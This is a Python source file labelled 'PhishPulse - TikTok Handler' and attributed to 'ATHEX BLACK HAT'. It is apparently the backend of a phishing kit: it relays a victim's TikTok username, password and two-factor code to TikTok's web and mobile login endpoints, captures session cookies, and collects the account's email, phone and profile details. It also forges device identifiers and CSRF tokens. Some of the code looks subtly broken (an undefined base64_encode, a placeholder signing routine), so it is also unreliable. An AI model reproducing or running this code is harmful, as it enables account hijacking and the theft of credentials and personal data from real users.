#!/usr/bin/env python3
"""
PhishPulse - TikTok Handler
Version: 1.0
Author: ATHEX BLACK HAT

Handles: Login (Web + App API), 2FA, Profile Fetch, Cookies Extraction
Uses both TikTok Web API and Mobile App API
"""

import requests
import json
import re
import time
import hashlib
import random
import string
from datetime import datetime
from urllib.parse import urlencode
from colorama import Fore, Style

class TikTokHandler:
    """Advanced TikTok API Handler - Web & App APIs"""
    
    def __init__(self):
        self.name = "TikTok"
        self.base_url = "https://www.tiktok.com"
        self.api_url = "https://www.tiktok.com/api"
        self.mobile_api = "https://api16-normal-c-useast1a.tiktokv.com"
        self.user_agent_default = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        self.mobile_user_agent = "com.zhiliaoapp.musically/2024700040 (Linux; U; Android 14; en_US; SM-S908B; Build/UP1A.231005.007; Cronet/122.0.6261.64)"
        self.session = requests.Session()
        self.csrf_token = None
        self.sessionid = None
        
        # TikTok App API parameters
        self.app_id = "1459"
        self.app_version = "34.4.3"
        self.device_id = self._generate_device_id()
        self.iid = self._generate_iid()
        self.openudid = self._generate_openudid()
    
    def _generate_device_id(self):
        """Generate random device ID"""
        return ''.join(random.choices(string.digits, k=19))
    
    def _generate_iid(self):
        """Generate random install ID"""
        return ''.join(random.choices(string.digits, k=19))
    
    def _generate_openudid(self):
        """Generate random Open UDID"""
        return ''.join(random.choices('0123456789abcdef', k=16))
    
    def _generate_x_tt_params(self, url):
        """Generate X-TT-Params for TikTok API"""
        timestamp = int(time.time())
        # Simplified version - TikTok uses complex encryption
        return base64_encode(f"app_id={self.app_id}&timestamp={timestamp}")
    
    def _extract_cookies(self, response):
        """Extract all cookies from response"""
        cookies_dict = {}
        for cookie in response.cookies:
            cookies_dict[cookie.name] = cookie.value
        
        set_cookie_headers = response.headers.get('Set-Cookie', '')
        if set_cookie_headers:
            for cookie_str in set_cookie_headers.split(','):
                cookie_str = cookie_str.strip()
                if '=' in cookie_str:
                    parts = cookie_str.split(';')[0].split('=')
                    if len(parts) == 2:
                        cookies_dict[parts[0].strip()] = parts[1].strip()
        
        return cookies_dict
    
    def _sign_request(self, params):
        """Sign request parameters for TikTok API"""
        # Simplified signing - TikTok uses complex algorithms
        param_str = '&'.join([f'{k}={v}' for k, v in sorted(params.items())])
        return hashlib.md5(param_str.encode()).hexdigest()
    
    def login(self, username, password, user_agent=None):
        """
        Attempt TikTok Login
        Tries Web API first, then falls back to App API
        
        Args:
            username: TikTok username/email/phone
            password: Plain text password
            user_agent: Browser user agent
            
        Returns:
            tuple: (result_dict, cookies_dict, profile_dict)
        """
        if not user_agent:
            user_agent = self.user_agent_default
        
        # Try Web API first
        result, cookies, profile = self._login_web(username, password, user_agent)
        
        if result.get('authenticated') or result.get('two_factor_required'):
            return result, cookies, profile
        
        # Fallback to Mobile App API
        result, cookies, profile = self._login_mobile(username, password)
        
        if result.get('authenticated') or result.get('two_factor_required'):
            return result, cookies, profile
        
        return result, cookies, profile
    
    def _login_web(self, username, password, user_agent):
        """TikTok Web Login"""
        # Get CSRF token first
        try:
            init_response = self.session.get(
                self.base_url,
                headers={'User-Agent': user_agent},
                timeout=30
            )
            
            self.csrf_token = init_response.cookies.get('tt_csrf_token', '')
            
            # Generate CSRF if not found
            if not self.csrf_token:
                self.csrf_token = hashlib.md5(str(time.time()).encode()).hexdigest()[:32]
        
        except:
            self.csrf_token = hashlib.md5(str(time.time()).encode()).hexdigest()[:32]
        
        login_url = f"{self.api_url}/v1/web/passport/login/"
        
        headers = {
            'User-Agent': user_agent.strip(),
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-CSRFToken': self.csrf_token,
            'X-TT-Params': self._generate_x_tt_params(login_url),
            'Origin': 'https://www.tiktok.com',
            'Referer': 'https://www.tiktok.com/login/',
            'Cookie': f'tt_csrf_token={self.csrf_token}',
        }
        
        # Determine account type
        account_type = self._detect_account_type(username)
        
        login_data = {
            account_type: username,
            'password': password,
            'service': 'https://www.tiktok.com/',
            'csrf_token': self.csrf_token,
        }
        
        try:
            response = self.session.post(
                login_url,
                headers=headers,
                data=login_data,
                timeout=30
            )
            
            cookies = self._extract_cookies(response)
            
            try:
                result = response.json()
            except:
                result = {}
            
            # Parse response
            login_result = self._parse_web_response(result, cookies)
            
            if login_result.get('authenticated'):
                profile = self._fetch_profile_web(cookies, user_agent)
                return login_result, cookies, profile
            
            return login_result, cookies, {}
        
        except Exception as e:
            return {
                'authenticated': False,
                'status': 'ok',
                'message': 'Connection error. Please try again.',
                'user': True
            }, {}, {}
    
    def _login_mobile(self, username, password):
        """TikTok Mobile App API Login"""
        login_url = f"{self.mobile_api}/passport/user/login/"
        
        headers = {
            'User-Agent': self.mobile_user_agent,
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept-Language': 'en-US,en;q=0.9',
        }
        
        account_type = self._detect_account_type(username)
        
        # App API parameters
        params = {
            'account_type': account_type,
            'username': username,
            'password': password,
            'device_id': self.device_id,
            'iid': self.iid,
            'openudid': self.openudid,
            'app_id': self.app_id,
            'version_code': self.app_version,
            'os_api': '34',
            'os_version': '14',
            'device_type': 'SM-S908B',
            'device_platform': 'android',
            'channel': 'googleplay',
            'language': 'en',
            'region': 'US',
        }
        
        # Sign the request
        params['_signature'] = self._sign_request(params)
        
        try:
            response = requests.post(
                login_url,
                headers=headers,
                data=urlencode(params),
                timeout=30
            )
            
            cookies = self._extract_cookies(response)
            
            try:
                result = response.json()
            except:
                result = {}
            
            login_result = self._parse_mobile_response(result, cookies)
            
            if login_result.get('authenticated'):
                profile = self._fetch_profile_mobile(cookies)
                return login_result, cookies, profile
            
            return login_result, cookies, {}
        
        except Exception as e:
            return {
                'authenticated': False,
                'status': 'ok',
                'message': 'Connection error. Please try again.',
                'user': True
            }, {}, {}
    
    def verify_2fa(self, code, identifier, username, user_agent=None, method='unknown'):
        """
        Verify TikTok Two-Factor Authentication
        
        Args:
            code: 6-digit verification code
            identifier: 2FA identifier
            username: TikTok username
            user_agent: Browser user agent
            method: 2FA method
            
        Returns:
            tuple: (result_dict, cookies_dict, profile_dict)
        """
        if not user_agent:
            user_agent = self.user_agent_default
        
        # Try web 2FA first
        result, cookies, profile = self._verify_2fa_web(code, identifier, username, user_agent)
        
        if result.get('authenticated'):
            return result, cookies, profile
        
        # Try mobile 2FA
        result, cookies, profile = self._verify_2fa_mobile(code, identifier, username)
        
        return result, cookies, profile
    
    def _verify_2fa_web(self, code, identifier, username, user_agent):
        """TikTok Web 2FA Verification"""
        verify_url = f"{self.api_url}/v1/web/passport/two_step_verification/"
        
        headers = {
            'User-Agent': user_agent.strip(),
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-CSRFToken': self.csrf_token or '',
            'Origin': 'https://www.tiktok.com',
            'Referer': 'https://www.tiktok.com/login/',
        }
        
        data = {
            'code': code,
            'two_step_verification_token': identifier,
            'csrf_token': self.csrf_token or '',
        }
        
        try:
            response = self.session.post(
                verify_url,
                headers=headers,
                data=data,
                timeout=30
            )
            
            cookies = self._extract_cookies(response)
            
            try:
                result = response.json()
            except:
                result = {}
            
            if result.get('status_code') == 0 or 'sessionid' in cookies:
                profile = self._fetch_profile_web(cookies, user_agent)
                return {'authenticated': True, 'status': 'ok'}, cookies, profile
            
            return {
                'authenticated': False,
                'status': 'ok',
                'message': result.get('status_msg', 'Invalid verification code.')
            }, {}, {}
        
        except:
            return {
                'authenticated': False,
                'status': 'ok',
                'message': 'Verification failed. Please try again.'
            }, {}, {}
    
    def _verify_2fa_mobile(self, code, identifier, username):
        """TikTok Mobile 2FA Verification"""
        verify_url = f"{self.mobile_api}/passport/auth/check_code/"
        
        headers = {
            'User-Agent': self.mobile_user_agent,
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        
        params = {
            'code': code,
            'token': identifier,
            'device_id': self.device_id,
            'iid': self.iid,
        }
        
        try:
            response = requests.post(verify_url, headers=headers, data=params, timeout=30)
            cookies = self._extract_cookies(response)
            
            try:
                result = response.json()
            except:
                result = {}
            
            if result.get('status_code') == 0:
                profile = self._fetch_profile_mobile(cookies)
                return {'authenticated': True, 'status': 'ok'}, cookies, profile
            
            return {
                'authenticated': False,
                'status': 'ok',
                'message': 'Invalid verification code.'
            }, {}, {}
        
        except:
            return {
                'authenticated': False,
                'status': 'ok',
                'message': 'Verification failed. Please try again.'
            }, {}, {}
    
    def _fetch_profile_web(self, cookies, user_agent=None):
        """Fetch TikTok profile via Web API"""
        if not user_agent:
            user_agent = self.user_agent_default
        
        cookie_str = '; '.join([f'{k}={v}' for k, v in cookies.items()])
        
        headers = {
            'User-Agent': user_agent.strip(),
            'Cookie': cookie_str,
            'Accept': 'application/json',
            'Referer': 'https://www.tiktok.com/',
        }
        
        try:
            response = requests.get(
                f'{self.api_url}/v1/user/info/',
                headers=headers,
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                user_info = data.get('userInfo', data.get('user', {}))
                
                return {
                    'email': user_info.get('email', ''),
                    'phone': user_info.get('mobile', ''),
                    'full_name': user_info.get('nickname', user_info.get('uniqueId', '')),
                    'bio': user_info.get('signature', user_info.get('bio', '')),
                    'followers': user_info.get('followerCount', user_info.get('follower_count', 0)),
                    'following': user_info.get('followingCount', user_info.get('following_count', 0)),
                    'videos_count': user_info.get('videoCount', user_info.get('video_count', 0)),
                    'likes_count': user_info.get('heartCount', user_info.get('likes_count', 0)),
                    'is_verified': user_info.get('verified', False),
                    'avatar_url': user_info.get('avatarMedium', user_info.get('avatar_medium', '')),
                    'username': user_info.get('uniqueId', user_info.get('username', '')),
                    'region': user_info.get('region', ''),
                }
        except:
            pass
        
        return {}
    
    def _fetch_profile_mobile(self, cookies):
        """Fetch TikTok profile via Mobile API"""
        cookie_str = '; '.join([f'{k}={v}' for k, v in cookies.items()])
        
        headers = {
            'User-Agent': self.mobile_user_agent,
            'Cookie': cookie_str,
            'Accept': 'application/json',
        }
        
        try:
            params = {
                'device_id': self.device_id,
                'iid': self.iid,
            }
            
            response = requests.get(
                f'{self.mobile_api}/aweme/v1/user/profile/self/',
                headers=headers,
                params=params,
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                user_info = data.get('user', {})
                
                return {
                    'email': user_info.get('email', ''),
                    'phone': user_info.get('mobile', ''),
                    'full_name': user_info.get('nickname', ''),
                    'bio': user_info.get('signature', ''),
                    'followers': user_info.get('follower_count', 0),
                    'following': user_info.get('following_count', 0),
                    'videos_count': user_info.get('aweme_count', 0),
                    'likes_count': user_info.get('total_favorited', 0),
                    'is_verified': user_info.get('custom_verify', '') != '' or user_info.get('enterprise_verify_reason', '') != '',
                    'avatar_url': user_info.get('avatar_medium', {}).get('url_list', [''])[0] if isinstance(user_info.get('avatar_medium'), dict) else '',
                    'username': user_info.get('unique_id', ''),
                    'region': user_info.get('region', ''),
                }
        except:
            pass
        
        return {}
    
    def _parse_web_response(self, result, cookies):
        """Parse TikTok Web API response"""
        status_code = result.get('status_code', result.get('code', -1))
        status_msg = result.get('status_msg', result.get('message', ''))
        
        # Success
        if status_code == 0 or 'sessionid' in cookies:
            return {'authenticated': True, 'status': 'ok'}
        
        # 2FA required
        if status_code == 1008 or 'two_step' in status_msg.lower() or 'verification' in status_msg.lower():
            return {
                'authenticated': False,
                'two_factor_required': True,
                'two_factor_identifier': result.get('two_step_verification_token', result.get('token', '')),
                'twofa_method': self._detect_2fa_method(status_msg),
                'status': 'ok',
                'message': status_msg or 'Enter your verification code.'
            }
        
        # Errors
        error_msg = self._parse_error_message(status_code, status_msg)
        
        return {
            'authenticated': False,
            'status': 'ok',
            'message': error_msg,
            'user': True
        }
    
    def _parse_mobile_response(self, result, cookies):
        """Parse TikTok Mobile API response"""
        status_code = result.get('status_code', result.get('code', -1))
        status_msg = result.get('status_msg', result.get('message', ''))
        
        # Success
        if status_code == 0 or 'sessionid' in cookies:
            return {'authenticated': True, 'status': 'ok'}
        
        # 2FA required
        if status_code == 1008 or 'verification' in status_msg.lower():
            return {
                'authenticated': False,
                'two_factor_required': True,
                'two_factor_identifier': result.get('token', result.get('verify_ticket', '')),
                'twofa_method': self._detect_2fa_method(status_msg),
                'status': 'ok',
                'message': status_msg or 'Enter verification code.'
            }
        
        error_msg = self._parse_error_message(status_code, status_msg)
        
        return {
            'authenticated': False,
            'status': 'ok',
            'message': error_msg,
            'user': True
        }
    
    def _parse_error_message(self, status_code, status_msg):
        """Parse TikTok error messages"""
        error_map = {
            1001: 'Invalid account or password.',
            1002: 'Account not found.',
            1003: 'Account has been suspended.',
            1004: 'Too many login attempts. Please try again later.',
            1005: 'Account needs verification.',
            1006: 'Login from new device. Please verify.',
            1007: 'Password is incorrect.',
            1009: 'Network error. Please try again.',
            1010: 'Account is locked for security.',
        }
        
        if status_code in error_map:
            return error_map[status_code]
        
        if status_msg:
            if 'password' in status_msg.lower() and 'incorrect' in status_msg.lower():
                return 'The password you entered is incorrect.'
            elif 'not found' in status_msg.lower():
                return 'Account not found.'
            elif 'suspended' in status_msg.lower():
                return 'This account has been suspended.'
            elif 'too many' in status_msg.lower():
                return 'Too many attempts. Please try again later.'
        
        return status_msg or 'Invalid credentials. Please try again.'
    
    def _detect_account_type(self, username):
        """Detect if input is email, phone, or username"""
        if '@' in username:
            return 'email'
        elif username.replace('+', '').replace('-', '').replace(' ', '').isdigit():
            return 'mobile'
        else:
            return 'username'
    
    def _detect_2fa_method(self, status_msg):
        """Detect 2FA method from message"""
        msg_lower = status_msg.lower()
        
        if 'sms' in msg_lower or 'phone' in msg_lower or 'text' in msg_lower:
            return 'sms'
        elif 'email' in msg_lower or 'mail' in msg_lower:
            return 'email'
        elif 'authenticator' in msg_lower or 'app' in msg_lower:
            return 'authenticator'
        else:
            return 'unknown'